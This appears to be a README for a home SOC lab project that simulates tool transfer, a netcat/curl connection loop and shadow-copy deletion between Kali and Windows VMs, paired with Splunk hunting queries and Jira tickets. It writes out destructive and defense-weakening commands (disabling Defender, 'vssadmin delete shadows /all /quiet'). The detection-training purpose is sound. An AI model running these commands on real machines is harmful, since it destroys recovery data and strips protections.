
# Modern SOC Analyst Project: End-to-End Threat Hunting & Incident Response Pipeline

## 📌 Project Overview
This project demonstrates the engineering, execution, and triage of a modern, automated Security Operations Center (SOC) environment. The architecture mimics an enterprise detection engineering pipeline, integrating an endpoint telemetry collector, a centralized SIEM platform, and automated ticketing orchestration to capture and respond to advanced post-exploitation techniques.

---

## 🛠️ Infrastructure Architecture
*   **Victim Host VM:** Windows 10 Workstation (`192.168.189.128`)
*   **Attacker Host VM:** Kali Linux (`192.168.189.129`)
*   **Telemetry Collectors:** Microsoft Sysmon & Wazuh Agent v4.x
*   **Centralized SIEM:** Splunk Enterprise (Targeting index sourcetype: `WinEventLog:Microsoft-Windows-Sysmon/Operational`)
*   **SOAR & Orchestration:** Shuffle Workflow Automation linked to Jira Backlog

---

## ⚙️ Initial Defense Engineering Layout (Pre-Execution)
To allow post-exploitation behavior monitoring without immediate endpoint prevention interference, Microsoft Defender Antivirus real-time engines were programmatically paused, while the stateful host firewall remained operational with explicit traffic routing channels.

### Windows 10 Host Preparation Commands (PowerShell - Admin):
```powershell
# Disable Defender real-time signatures to analyze post-exploitation footprints
Set-MpPreference -DisableRealtimeMonitoring $true

# Maintain firewall integrity while allowing custom evaluation traffic
New-NetFirewallRule -DisplayName "SOC Lab Testing" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444
```

---

## ⚔️ Attack Execution Steps, SIEM Hunting Queries, & Jira Tickets

### 📥 Attack Vector 1: Ingress Tool Transfer (The File Download Staging)
*   **MITRE ATT&CK Mapping:** T1105 (Ingress Tool Transfer)
*   **Wazuh Automation Mapping:** Rule `60110` (Windows Process Execution)
*   **Assigned Jira Tickets:** `SCRUM-1754`, `SCRUM-1758`

#### 1. Execution Steps
Spin up a native Python web storage utility on Kali Linux to hold the malicious script file:
```bash
# On Kali Linux (Navigate to file location and start web hosting server):
cd ~/Desktop
sudo python3 -m http.server 80
```
On the Windows 10 VM, open a web browser and execute a standard network fetch pull request to download the script file:
```text
URL Destination: http://192.168.189.129
```
*(Move the downloaded `soc_alert.bat` file directly onto the Windows 10 user desktop).*

#### 2. Splunk Threat Hunting Query
```spl
index=* sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=11 TargetFilename="*soc_alert.bat*"
| table _time, Computer, User, Image, TargetFilename
| rename TargetFilename as "Downloaded Threat File", Image as "Source Application"
```

---

### 📤 Attack Vector 2: Application Protocol Exfiltration (The High-Velocity Curl Loop)
*   **MITRE ATT&CK Mapping:** T1071 (Application Layer Protocol)
*   **Wazuh Automation Mapping:** Rule `67022` (Windows Event Forwarding Network Log)
*   **Assigned Jira Tickets:** `SCRUM-1755`, `SCRUM-1756`, `SCRUM-1759`, `SCRUM-1760`

#### 1. Execution Steps
Set up a persistent response listener on the attacker engine to ingest exfiltrated packet text strings:
```bash
# On Kali Linux Terminal:
while true; do echo -e "HTTP/1.1 200 OK\n\n Connection Successful" | nc -lvnp 4444; done
```
Execute an automated loop via the native command processor on Windows to flood the target port, bypassing basic text string signature rules:
```cmd
# On Windows 10 Command Prompt (Admin):
for /L %i in (1,1,10) do curl http://192.168.189.129
```

#### 2. Splunk Threat Hunting Query
```spl
index=* sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 DestinationIp="192.168.189.129" DestinationPort=4444
| bucket _time span=1m
| stats count as "Connection Attempts" by _time, SourceIp, DestinationIp
```

---

### ❌ Attack Vector 3: Ransomware Recovery Inhibition (Shadow Copy Elimination)
*   **MITRE ATT&CK Mapping:** T1490 (Inhibit System Recovery) / T1059 (Command & Scripting Interpreter)
*   **Wazuh Automation Mapping:** Rule `67023` (Administrative Utility Privilege Request)
*   **Assigned Jira Tickets:** `SCRUM-1761`, `SCRUM-1763`, `SCRUM-1764`, `SCRUM-1765`

#### 1. Execution Steps
Double-click the `soc_alert.bat` file on your Windows 10 desktop to initiate the custom lockdown window UI logic loop. Next, force background administrative backup purges via the shell terminal:
```cmd
# On Windows 10 Command Prompt (Admin):
vssadmin.exe delete shadows /all /quiet
```

#### 2. Splunk Threat Hunting Query
```spl
index=* sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 "vssadmin"
| table _time, Computer, User, Image, CommandLine
| rename CommandLine as "Executed Ransomware Command"
```

---

## 📝 Triage, Eradication, & Incident Closure Playbook
1.  **Endpoint Isolation:** Disconnect host network interface cards internally within the hypervisor virtual environment if suspicious Event Code 3 thresholds are broken.
2.  **Process Termination:** Locate the parent shell Process IDs (PIDs) running loop structures and execute forced kill states.
3.  **Sanitization Action:** Run local artifact scrub routines to purge experimental directories safely:
    ```cmd
    rmdir /s /q C:\SOC_Test_Data
    ```
4.  **Ticket Remediation:** Update assigned ticket statuses inside Jira (`SCRUM-1754`, `SCRUM-1755`, `SCRUM-1761`) from "To Do" to "Done", attaching query screenshots as empirical analyst verification proof.
